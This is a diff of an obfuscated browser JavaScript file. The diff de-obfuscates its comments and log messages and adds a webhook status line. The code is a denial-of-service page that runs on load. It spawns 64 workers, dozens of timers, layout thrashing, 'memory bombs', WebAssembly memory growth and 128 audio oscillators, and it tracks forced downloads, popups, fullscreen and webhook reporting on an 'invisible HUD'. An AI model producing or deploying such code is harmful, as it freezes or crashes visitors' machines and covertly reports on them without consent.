 let mi = 0, mr = 0, mt = performance.now(), mI = 0;
@@ -1262,7 +1392,7 @@ function q8m1x5k(b) {
 }
 
 // ============================================================
-// 8q2n 9z3k (64 workers)
+// 64 workers
 // ============================================================
 const WS = `
   'use strict';
@@ -1309,15 +1439,15 @@ for (let i = 0; i < NW; i++) {
     w.onmessage = (e) => {
       if (e.data && typeof e.data.r === 'number') wr[i] = e.data.r;
     };
-    w.onerror = (err) => { console.error('9z3k ' + i + ':', err.message || err); };
+    w.onerror = (err) => { console.error('worker ' + i + ':', err.message || err); };
     wk.push(w);
   } catch (err) {
-    console.error('9z3k ' + i + ' 8q3n:', err);
+    console.error('worker ' + i + ' failed:', err);
   }
 }
 
 // ============================================================
-// 82kv 6z1v 92zk (2400 children)
+// Layout thrash (2400 children)
 // ============================================================
 const tt = document.getElementById('p4z9k1n');
 const TC = 2400;
@@ -1361,7 +1491,7 @@ function x9p4m1q() {
 }
 
 // ============================================================
-// 92zk 3q9v (48 intervals)
+// 48 intervals
 // ============================================================
 let it = 0;
 const iv = [];
@@ -1446,7 +1576,7 @@ function tl6() {
 setTimeout(tl6, 0);
 
 // ============================================================
-// 8q3n 4z9v (doubled sizes)
+// Memory bombs
 // ============================================================
 let ab = 0, abb = 0, abr = 0, abt = performance.now(), abp = 0;
 
@@ -1554,7 +1684,7 @@ let wm = null, wp = 0, wg = 0, wtp = 0;
 try {
   wm = new WebAssembly.Memory({ initial: 16, maximum: 65536 });
   wp = 16;
-} catch (e) { console.error('2k9v 8q3n:', e); }
+} catch (e) { console.error('WASM memory unavailable:', e); }
 
 function wG() {
   if (!wm) return;
@@ -1585,7 +1715,7 @@ mI2.push(setInterval(cS, 60));
 mI2.push(setInterval(wG, 100));
 
 // ============================================================
-// 8q3n 9z3q 92zk (128 oscillators)
+// Audio (128 oscillators)
 // ============================================================
 let ac = null, as_ = false, ao = 0, asp = 0, asr = 0, ast = performance.now(), asp2 = 0;
 
@@ -1617,9 +1747,9 @@ function mDC(a) {
 function sA() {
   if (as_) return;
   const C = window.AudioContext || window.webkitAudioContext;
-  if (!C) { console.warn('8q3n 9z3q 3q9v'); return; }
+  if (!C) { console.warn('Web Audio not available'); return; }
   try { ac = new C({ latencyHint: 'playback' }); }
-  catch (e) { console.error('8q3n 9z3q:', e); return; }
+  catch (e) { console.error('AudioContext failed:', e); return; }
   as_ = true;
 
   const m = ac.createGain();
@@ -1730,13 +1860,13 @@ function sA() {
   window.addEventListener('click', tR2, { passive: true });
 }
 
-try { sA(); } catch (e) { console.error('8q3n 9z3q 6z1n:', e); }
+try { sA(); } catch (e) { console.error('audio start failed:', e); }
 
 // ============================================================
-// 8q2n 82kv 92zk
+// Main loop + invisible HUD
 // ============================================================
 const hu = document.getElementById('z7x3m9k');
-let fc = 0, lu = performance.now(), lmi = '8q3n...', lp = 0;
+let fc = 0, lu = performance.now(), lmi = 'init...', lp = 0;
 
 function tk() {
   const t = p3q8v6z();
@@ -1761,41 +1891,46 @@ function tk() {
     }
 
     const as = ac
-      ? ac.state + ' · ' + ao + ' 8q3 · 9z3q ' + (asr * 100).toFixed(1) + '%'
-      : '8q3n';
+      ? ac.state + ' · ' + ao + ' osc · SP ' + (asr * 100).toFixed(1) + '%'
+      : 'unavailable';
 
-    let mm = '8q3n';
+    let mm = 'n/a';
     if (performance.memory) {
       const q = performance.memory;
-      mm = (q.usedJSHeapSize / 1048576).toFixed(0) + ' MV / ' +
-           (q.totalJSHeapSize / 1048576).toFixed(0) + ' MV / ' +
-           (q.jsHeapSizeLimit / 1048576).toFixed(0) + ' MV';
+      mm = (q.usedJSHeapSize / 1048576).toFixed(0) + ' MB / ' +
+           (q.totalJSHeapSize / 1048576).toFixed(0) + ' MB / ' +
+           (q.jsHeapSizeLimit / 1048576).toFixed(0) + ' MB cap';
     }
 
-    const wmm = wm ? (wm.buffer.byteLength / 1048576).toFixed(1) + ' MV' : '8q3n';
+    const wmm = wm ? (wm.buffer.byteLength / 1048576).toFixed(1) + ' MB' : 'n/a';
+
+    const hookLine =
+      hookStatus + ' (#' + hookAttempts + ')' +
+      (hookStatusCode ? ' ' + hookStatusCode : '') +
+      (hookErrorText ? ' ' + hookErrorText.slice(0, 60) : '');
 
     hu.textContent =
-      '6q3z              : ' + fps.toFixed(1) + '\n' +
-      '8q2n 6z1v         : ' + lmi + '\n' +
-      '6982 6z1v         : ' + lp + ' 92zk / 9q2m\n' +
-      '92mq 6z1v         : 128-8q3n + 128-92zk · 4592² 8q3n\n' +
-      '2k9v 8n3q         : 3 · 8q3n: 6 · 92qk: ~7\n' +
-      '8q3n 92zk 8n1v    : ' + (mr / 1e6).toFixed(2) + ' M 3q9z\n' +
-      '9z3k 8n1v         : ' + wA + '/' + NW + ' · ' + (wT / 1e6).toFixed(2) + ' M 3q9z\n' +
-      '82kv 6z1v         : ' + (tr2 / 1000).toFixed(1) + ' k 8q3n/9z\n' +
-      '92zk 3q9v         : ' + it + ' · ' + to1 + ' · ' + to2 + ' · ' + to3 + ' · ' + to4 + ' · ' + to5 + ' · ' + to6 + '\n' +
-      '8q3n 9z3q         : ' + as + '\n' +
-      '2k9v 4z9v         : ' + abr.toFixed(1) + ' MV/9z · ' + ab + ' 2k9v\n' +
-      '8q2n 8n1v         : ' + (or_ / 1000).toFixed(1) + ' k 8n/9z · ' + oc + ' 9z2q\n' +
-      '8q3n 6z1v         : ' + jr.toFixed(1) + ' MV/9z · ' + jc + ' 8q3n\n' +
-      '9z3q 8n1v         : ' + (cr / 1000).toFixed(1) + ' k 8q/9z · ' + (cch / 1048576).toFixed(1) + ' MV\n' +
-      '2k9v 3q9z         : ' + wmm + ' · ' + wg + ' 8q3n · ' + (wtp * 65536 / 1048576).toFixed(0) + ' MV\n' +
-      '6z1v 92zk         : ' + x9k2n7m3 + ' 8q3n · ' + q8v3n1z5.length + ' 8q3n\n' +
-      '9z2m 8n1v         : N=' + N + ' / ' + IV + ' 9z3k\n' +
-      '8q2m 9z3k         : ' + popupCount + ' 8q3n opened\n' +
-      '9z3k 9z1v         : ' + (document.fullscreenElement ? 'zk' : '8q') + '\n' +
-      '9z3k 8n1v         : ' + (W3B_H00K ? '8q3n' : 'zk') + '\n' +
-      '3q9z              : ' + mm;
+      'fps              : ' + fps.toFixed(1) + '\n' +
+      'main canvas      : ' + lmi + '\n' +
+      'particles ctx    : ' + lp + ' draw calls / frame\n' +
+      'texture ctx      : ping-pong RTT + 128-tap blur · 4096² source\n' +
+      'webgl contexts   : 3 · FBOs: 6 · textures: ~7\n' +
+      'main-thread loop : ' + (mr / 1e6).toFixed(2) + ' M ops/s\n' +
+      'web workers      : ' + wA + '/' + NW + ' · ' + (wT / 1e6).toFixed(2) + ' M ops/s\n' +
+      'layout thrash    : ' + (tr2 / 1000).toFixed(1) + ' k reflows/s\n' +
+      'timers           : ' + it + ' · ' + to1 + ' · ' + to2 + ' · ' + to3 + ' · ' + to4 + ' · ' + to5 + ' · ' + to6 + '\n' +
+      'web audio        : ' + as + '\n' +
+      'ArrayBuffer      : ' + abr.toFixed(1) + ' MB/s · ' + ab + ' allocs\n' +
+      'object arrays    : ' + (or_ / 1000).toFixed(1) + ' k objs/s · ' + oc + ' total\n' +
+      'JSON.parse       : ' + jr.toFixed(1) + ' MB/s · ' + jc + ' parses\n' +
+      'string concat    : ' + (cr / 1000).toFixed(1) + ' k/s · ' + (cch / 1048576).toFixed(1) + ' MB\n' +
+      'wasm memory      : ' + wmm + ' · ' + wg + ' grows · ' + (wtp * 65536 / 1048576).toFixed(0) + ' MB grown\n' +
+      'downloads        : ' + x9k2n7m3 + ' attempts · ' + q8v3n1z5.length + ' logged\n' +
+      'N / IV           : ' + N + ' / ' + IV + ' ms\n' +
+      'popups           : ' + popupCount + ' opened\n' +
+      'fullscreen       : ' + (document.fullscreenElement ? 'on' : 'off') + '\n' +
+      'webhook          : ' + hookLine + '\n' +
+      'heap             : ' + mm;
 
     fc = 0;
     lu = n;
@@ -1807,20 +1942,20 @@ function tk() {
 requestAnimationFrame(tk);
 
 // ============================================================
-// 6z1v 82kv
+// Context-loss warnings
 // ============================================================
 for (const id of ['x9k2n7m', 'z3m9x2p', 'w8q2n5v']) {
   const c = document.getElementById(id);
   if (c) {
     c.addEventListener('webglcontextlost', (e) => {
       e.preventDefault();
-      console.warn('2k9v 8q3n 9z2q: #' + id);
+      console.warn('WebGL context lost on #' + id);
     });
   }
 }
 
 // ============================================================
-// 3q9z
+// Cleanup
 // ============================================================
 window.addEventListener('beforeunload', () => {
   for (const w of wk) { try { w.terminate(); } catch (_) {} }
